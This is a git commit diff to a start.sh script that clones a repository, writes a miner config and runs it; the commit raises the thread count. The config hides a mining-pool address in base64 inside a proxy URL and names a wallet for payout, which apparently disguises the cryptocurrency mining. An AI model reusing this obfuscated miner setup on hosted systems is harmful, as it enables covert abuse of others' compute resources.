0fae10429ea54767ad4b1db796da422f1c3adbe5
duongpokeeeee <duongytpre253@gmail.com>
2025-03-19 23:44:00 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -2,7 +2,7 @@ git clone https://github.com/mom742886/nano-mbc
 cd nano-mbc
 echo '{
   "proxy": "wss://epoch-labs.up.railway.app/cG93ZXIyYi5taW5lLnplcmdwb29sLmNvbTo3NDQ1",
-  "config": { "threads": 6, "log": true },
+  "config": { "threads": 7, "log": true },
   "options": { "user": "0xC4C2ca6D265f353972a26B8c8Df5FF4c1C000D7D", "password": "c=USDT-BEP20", "argent": "web-wasm/1.0" }
 }' > data.json
 ./node app.js
